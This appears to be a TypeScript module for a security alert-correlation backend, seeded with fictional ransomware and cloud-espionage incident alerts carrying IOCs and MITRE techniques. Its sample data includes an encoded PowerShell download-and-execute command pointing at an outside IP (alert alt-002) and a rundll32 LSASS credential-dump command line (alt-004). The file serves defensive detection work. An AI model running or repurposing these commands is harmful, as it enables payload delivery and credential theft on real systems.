/**
 * backend/alertStore.ts
 *
 * Server-side in-memory alert store.
 * This is the single source of truth for raw security alerts consumed by the
 * correlation engine. It is seeded with known incident data on startup and can
 * be extended at runtime via addAlert() when new events are ingested.
 *
 * When Ax integrates Neo4j enriched alerts, swap getAlertStore() to query
 * the graph DB — the correlation engine requires zero changes.
 */

import { SecurityAlert, Severity, IOCType } from "../src/types.js";

let alertStore: SecurityAlert[] = [
  // ─────────────────────────────────────────────────────────────────
  // ShadowLock Ransomware Campaign — Wizard Spider TTPs
  // ─────────────────────────────────────────────────────────────────
  {
    id: "alt-001",
    title: "Spearphishing Email Payload Delivered",
    sourceSystem: "Phishing Gateway",
    severity: Severity.MEDIUM,
    timestamp: "2026-06-08T08:12:00Z",
    description:
      "Email with subject 'Invoice #88391-Action Required' containing malicious macro-enabled Excel attachment delivered to c-suite assistant.",
    iocs: [
      { type: IOCType.EMAIL, value: "finance@billing-dept-portal.com" },
      { type: IOCType.HASH, value: "4a8e3f9a77cd5ac244a0e98f09faef4c" },
    ],
    affectedAsset: "WS-CHLOE-LAPTOP (Chloe - CEO Assistant)",
    user: "chloe.harrison@enterprise.com",
    actionTaken: "alerted",
    mitreTTPs: [
      "T1566.001 - Spearphishing Attachment",
      "T1204.002 - User Execution: Malicious File",
    ],
  },
  {
    id: "alt-002",
    title: "Suspicious PowerShell Invocations from Excel Process",
    sourceSystem: "EDR",
    severity: Severity.HIGH,
    timestamp: "2026-06-08T08:14:15Z",
    description:
      "Excel spawning obfuscated PowerShell script with encoded command attempting to download external executable payload.",
    iocs: [
      {
        type: IOCType.PROCESS,
        value:
          "powershell.exe -NoP -NonI -W Hidden -Enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTg1LjI0Ny43Mi4xMjgvcGF5bG9hZCcp",
      },
      { type: IOCType.IP, value: "185.247.72.128" },
    ],
    affectedAsset: "WS-CHLOE-LAPTOP (Chloe - CEO Assistant)",
    user: "chloe.harrison@enterprise.com",
    actionTaken: "quarantined",
    mitreTTPs: [
      "T1059.001 - Command and Scripting Interpreter: PowerShell",
      "T1027 - Obfuscated Files or Information",
    ],
  },
  {
    id: "alt-003",
    title: "DNS Query to Known Dynamic DNS Backdoor Domain",
    sourceSystem: "DNS Log",
    severity: Severity.HIGH,
    timestamp: "2026-06-08T08:15:30Z",
    description:
      "Endpoint lookup for domain 'security-update-service-microsoft.com' which resolves behind multi-homed threat infrastructure.",
    iocs: [
      { type: IOCType.DOMAIN, value: "security-update-service-microsoft.com" },
      { type: IOCType.IP, value: "185.247.72.128" },
    ],
    affectedAsset: "WS-CHLOE-LAPTOP (Chloe - CEO Assistant)",
    actionTaken: "none",
    mitreTTPs: ["T1071.001 - Application Layer Protocol: Web Protocols"],
  },
  {
    id: "alt-004",
    title: "Unusual LSASS Process Memory Dump Detected",
    sourceSystem: "EDR",
    severity: Severity.CRITICAL,
    timestamp: "2026-06-08T08:22:11Z",
    description:
      "Unauthorized application attempted to read and dump memory of Local Security Authority Subsystem Service (LSASS) to harvest domain credentials.",
    iocs: [
      {
        type: IOCType.PROCESS,
        value: "rundll32.exe C:\\windows\\temp\\lsadmp.dll,Dump",
      },
      { type: IOCType.HASH, value: "c9ce6e902a7b88939e9fbfa7eb4db3bc" },
    ],
    affectedAsset: "WS-CHLOE-LAPTOP (Chloe - CEO Assistant)",
    user: "chloe.harrison@enterprise.com",
    actionTaken: "blocked",
    mitreTTPs: ["T1003.001 - OS Credential Dumping: Lsass Memory"],
  },
  {
    id: "alt-005",
    title: "Sudden Lateral Movement SMB Scanning Activities",
    sourceSystem: "SIEM",
    severity: Severity.HIGH,
    timestamp: "2026-06-08T08:29:40Z",
    description:
      "Chloe's laptop initiated massive port 445 (SMB) connection scanning requests across local HR and Production VLAN subnets in less than 30 seconds.",
    iocs: [
      { type: IOCType.IP, value: "10.0.4.15" },
      { type: IOCType.HOST, value: "HR-DB-SERVER-01" },
      { type: IOCType.HOST, value: "PROD-LOGISTICS-VM" },
    ],
    affectedAsset: "Internal Subnet 10.0.4.0/24",
    actionTaken: "alerted",
    mitreTTPs: [
      "T1046 - Network Service Discovery",
      "T1021.002 - Remote Services: SMB/Windows Admin Shares",
    ],
  },
  {
    id: "alt-006",
    title: "Successful Remote PowerShell Session Established",
    sourceSystem: "Active Directory",
    severity: Severity.CRITICAL,
    timestamp: "2026-06-08T08:31:00Z",
    description:
      "Domain Admin credentials derived from chloe-laptop utilized to open a remote session onto production database VM from unauthorized subnet.",
    iocs: [
      { type: IOCType.USER, value: "admin.backup" },
      { type: IOCType.IP, value: "10.0.4.15" },
    ],
    affectedAsset: "PROD-LOGISTICS-VM (Logistics Database)",
    actionTaken: "alerted",
    mitreTTPs: [
      "T1021.006 - Remote Services: Windows Remote Management",
      "T1078.002 - Valid Accounts: Domain Accounts",
    ],
  },
  {
    id: "alt-007",
    title: "Mass file rename event detected: ryuk/conti extension",
    sourceSystem: "EDR",
    severity: Severity.CRITICAL,
    timestamp: "2026-06-08T08:35:45Z",
    description:
      "Prod logistics database spawning multi-threaded file manipulation thread appended with encrypted file indices and dropping ransom note CONTI_README.txt.",
    iocs: [
      { type: IOCType.PROCESS, value: "srvhost_enc.exe" },
      { type: IOCType.HASH, value: "ffac3e4d693a8cf8becb71e19488a03c" },
    ],
    affectedAsset: "PROD-LOGISTICS-VM (Logistics Database)",
    actionTaken: "blocked",
    mitreTTPs: ["T1486 - Data Encrypted for Impact"],
  },

  // ─────────────────────────────────────────────────────────────────
  // Operation ArcticRift — Cloud Espionage Campaign (Fancy Bear TTPs)
  // ─────────────────────────────────────────────────────────────────
  {
    id: "alt-101",
    title: "Abnormal TLS Connection to Suspicious Subnet",
    sourceSystem: "Firewall",
    severity: Severity.MEDIUM,
    timestamp: "2026-06-08T05:00:10Z",
    description:
      "Cloud egress log identifies long-lived outbound SSL socket from core cloud application to unknown IP belonging to hosting provider in foreign region.",
    iocs: [
      { type: IOCType.IP, value: "203.0.113.88" },
      { type: IOCType.DOMAIN, value: "secure-dns-route.net" },
    ],
    affectedAsset: "Cloud-SaaS-Svc (AWS EC2 Instance)",
    actionTaken: "alerted",
    mitreTTPs: ["T1071.001 - Web Protocols"],
  },
  {
    id: "alt-102",
    title: "AWS Privilege Escalation Via IAM AssumeRole",
    sourceSystem: "CloudTrail",
    severity: Severity.HIGH,
    timestamp: "2026-06-08T05:05:22Z",
    description:
      "The AWS instance profile compromised from TLS hack assumed critical administrator IAM policy context from an unrecognized external endpoint IP.",
    iocs: [
      { type: IOCType.USER, value: "IAM-Dev-Role-Assumed" },
      { type: IOCType.IP, value: "203.0.113.88" },
    ],
    affectedAsset: "prod-cloud-accounts-env",
    actionTaken: "alerted",
    mitreTTPs: [
      "T1134 - Access Token Manipulation",
      "T1078.004 - Cloud Accounts",
    ],
  },
  {
    id: "alt-103",
    title: "S3 Bucket Synchronization and Massive Download",
    sourceSystem: "CloudTrail",
    severity: Severity.CRITICAL,
    timestamp: "2026-06-08T05:12:00Z",
    description:
      "Bulk data dump in progress. S3 bucket containing client proprietary blueprint CAD schemas was systematically packed, zipped and exfiltrated to the compromised server.",
    iocs: [
      { type: IOCType.IP, value: "203.0.113.88" },
      {
        type: IOCType.URL,
        value: "https://secure-dns-route.net/upload/sys-data.bin",
      },
    ],
    affectedAsset: "AWS-S3-BLUEPRINTS-VAULT",
    actionTaken: "none",
    mitreTTPs: [
      "T1119 - Automated Information Acquisition",
      "T1048.003 - Exfiltration Over Alternative Protocol",
    ],
  },
];

/** Returns a snapshot of all alerts currently in the store. */
export function getAlertStore(): SecurityAlert[] {
  return [...alertStore];
}

/** Appends a new alert to the store (called by POST /api/ingest). */
export function addAlert(alert: SecurityAlert): void {
  alertStore = [alert, ...alertStore];
}

/** Returns alert count per severity for dashboard stats. */
export function getAlertStats(): Record<string, number> {
  const stats: Record<string, number> = {
    CRITICAL: 0,
    HIGH: 0,
    MEDIUM: 0,
    LOW: 0,
  };
  for (const a of alertStore) {
    const sev = (a.severity as string).toUpperCase();
    if (sev in stats) stats[sev]++;
  }
  return stats;
}
